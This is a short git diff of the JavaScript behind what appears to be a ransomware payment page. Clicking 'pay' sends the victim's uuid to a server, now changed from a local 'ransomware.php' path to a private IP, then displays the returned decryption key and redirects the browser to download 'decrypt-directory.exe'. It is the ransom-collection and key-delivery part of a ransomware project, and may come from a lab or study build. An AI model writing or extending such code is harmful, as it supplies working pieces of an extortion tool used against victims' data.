@@ -7,19 +7,17 @@ $(document).ready(function(){
      // The .click functions get called after their respective .on functions
     $("#pay").click(function(e) {
         var jsonToSend = {
-            "uuid" : uuid,
-            "action" : "PAY"
+            "uuid" : uuid
         };
-        makeAjaxCall("http://eduardos-macbook-pro-15.local:8888/ransomware/ransomware.php", jsonToSend, function(data){
+        makeAjaxCall("http://192.168.24.231/pay", jsonToSend, function(data){
             console.log(data)
             $("#keySection").attr("class","visible")
-            $("#key").text(data.key)
+            var key = JSON.parse(data)
+            $("#key").text(key.Key)
             e.preventDefault();  //stop the browser from following
             window.location.href = 'decrypt-directory.exe';
         })
     })
-
-   
 })
 
 function getParameterByName(name, url) {
@@ -33,13 +31,11 @@ function getParameterByName(name, url) {
 }
 
 // This is the default AJAX call for anything
-function makeAjaxCall(url,params, callback){
+function makeAjaxCall(url, params, callback){
         $.ajax({
            url: url,
-           type: "POST",
+           type: "GET",
            data: params,
-           dataType : "json",
-           ContentType : "application/json",
            success : function(dataReceived){
             callback(dataReceived);
            },
